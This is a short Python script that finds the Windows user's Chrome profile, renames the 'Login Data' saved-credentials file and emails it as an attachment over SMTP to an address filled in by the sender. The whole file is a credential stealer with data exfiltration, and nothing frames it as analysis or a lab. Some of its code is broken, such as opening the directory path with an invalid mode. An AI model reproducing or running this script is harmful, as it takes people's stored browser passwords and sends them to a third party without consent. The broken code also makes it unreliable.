from os import *
import os
import time

t = os.environ['APPDATA']
os.chdir(t)
os.chdir('..')
p = os.listdir()
os.chdir("Local\Google")
pt = os.listdir()
os.chdir("Chrome\\User Data\\Default")
ptf = os.listdir()
tt = os.getcwd()
os.rename("Login Data", "Login Data.txt")
print (p)
print (pt)
print (ptf)

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
 
fromaddr = "Email here again"
toaddr = "Also email here"
 
msg = MIMEMultipart()
 
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Login Data"
 
body = "Heres the login"
 
msg.attach(MIMEText(body, 'plain'))
 
filename = "Login Data.txt"
attachment = open(tt, 1)
 
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
msg.attach(part)
 
server = smtplib.SMTP('smtp.live.com', 587) # if you have gmail change to smpt.gmail.com same port.
server.starttls()
server.login(fromaddr, "Password here")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
